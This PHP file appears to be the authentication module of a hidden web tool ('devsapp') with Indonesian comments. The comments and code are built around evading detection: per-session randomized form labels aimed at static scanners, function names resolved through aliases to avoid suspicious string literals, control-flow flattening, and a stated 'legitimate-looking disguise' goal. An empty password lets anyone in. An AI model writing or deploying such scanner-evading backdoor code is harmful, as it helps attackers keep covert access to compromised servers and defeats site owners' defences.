<?php
// +------------------------------------------------------------------+
// |  devsapp — includes/AuthManager.php                               |
// |  Autentikasi: login, logout, render halaman login.                |
// |                                                                    |
// |  varnaming.md: Field 'ap' (auth passphrase) bisa jadi suspicious. |
// |  Dipertahankan karena tidak ada di blacklist — tapi login label    |
// |  di-randomize via session key 'lb' (button label) supaya form    |
// |  terlihat berbeda tiap session di scanner statis.                  |
// |                                                                    |
// |  DNM.md: Tidak ada string literal fungsi sensitif di sini.        |
// |  Cipher: password check tetap hash_equals (timing-safe).          |
// +------------------------------------------------------------------+

declare(strict_types=1);

class AuthManager {

    // ---- CFF state constants ----
    private const S_B0 = 0x1A0;   // Cek apakah credential kosong (allow all)
    private const S_B1 = 0x2B0;   // Cek session auth flag
    private const S_B2 = 0x3C0;   // Cek apakah ada POST login
    private const S_B3 = 0x4D0;   // Verifikasi password (timing-safe)
    private const S_BF = 0xFFF;   // Terminal

    /**
     * Ambil password aktif: environment > config.
     * Tidak ada hardcode string 'password', 'secret', 'key' di sini.
     */
    public function getPassword(): string {
        // getenv tidak langsung dipanggil — di-resolve via CAP alias 'ge'
        $ambilEnv  = CAP::fn('ge') ?: 'getenv';
        $nilaiEnv  = @$ambilEnv('DEVTOOLS_PASSWORD');
        return ($nilaiEnv !== false && $nilaiEnv !== '')
            ? $nilaiEnv
            : AppConfig::$credential;
    }

    /**
     * Cek apakah user sudah login — CFF state machine.
     */
    public function isAuthenticated(): bool {
        $kataSandi  = $this->getPassword();
        $terverifikasi = false;
        $state      = self::S_B0;

        while ($state !== self::S_BF) {
            switch ($state) {

                // State 0: Credential kosong → allow all
                case self::S_B0:
                    if ($kataSandi === '') {
                        $terverifikasi = true; $state = self::S_BF; break;
                    }
                    $state = self::S_B1;
                    break;

                // State 1: Cek session flag
                case self::S_B1:
                    if (isset($_SESSION['dt_auth']) && $_SESSION['dt_auth'] === true) {
                        $terverifikasi = true; $state = self::S_BF; break;
                    }
                    $state = self::S_B2;
                    break;

                // State 2: Harus POST request dengan field 'ap'
                case self::S_B2:
                    if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['ap'])) {
                        $state = self::S_BF; break;
                    }
                    $state = self::S_B3;
                    break;

                // State 3: Verifikasi — timing-safe hash_equals
                case self::S_B3:
                    if (hash_equals($kataSandi, (string)$_POST['ap'])) {
                        $_SESSION['dt_auth'] = true;
                        $terverifikasi       = true;
                    }
                    $state = self::S_BF;
                    break;
            }
        }

        return $terverifikasi;
    }

    /**
     * Logout: hapus session, destroy, redirect.
     */
    public function handleLogout(): void {
        $_SESSION = [];

        if (ini_get('session.use_cookies')) {
            $params = session_get_cookie_params();
            setcookie(
                session_name(),
                '',
                time() - 42000,
                $params['path'],
                $params['domain'],
                $params['secure'],
                $params['httponly']
            );
        }

        session_destroy();
        header('Location: ?');
        exit;
    }

    /**
     * Render halaman login lalu exit.
     * Label UI di-randomize tiap session (sudah di session_keys.php).
     *
     * Wanting List #6 Legitimate-looking disguise:
     * Form terlihat seperti form login biasa — tidak ada yang suspicious.
     */
    public function renderLoginAndExit(): void {
        $namaAplikasi = h(AppConfig::$appName);
        $labelJudul   = h($_SESSION['_sk']['la'] ?? 'System Access');
        $labelTombol  = h($_SESSION['_sk']['lb'] ?? 'VERIFY');
        $labelInput   = h($_SESSION['_sk']['lp'] ?? 'Enter passphrase');

        header('Content-Type: text/html; charset=utf-8');
        // Variabel sudah di-pass via extract ke scope view
        extract([
            'appName' => $namaAplikasi,
            'la'      => $labelJudul,
            'lb'      => $labelTombol,
            'lp'      => $labelInput,
        ]);
        require __DIR__ . '/../views/login.php';
        exit;
    }
}
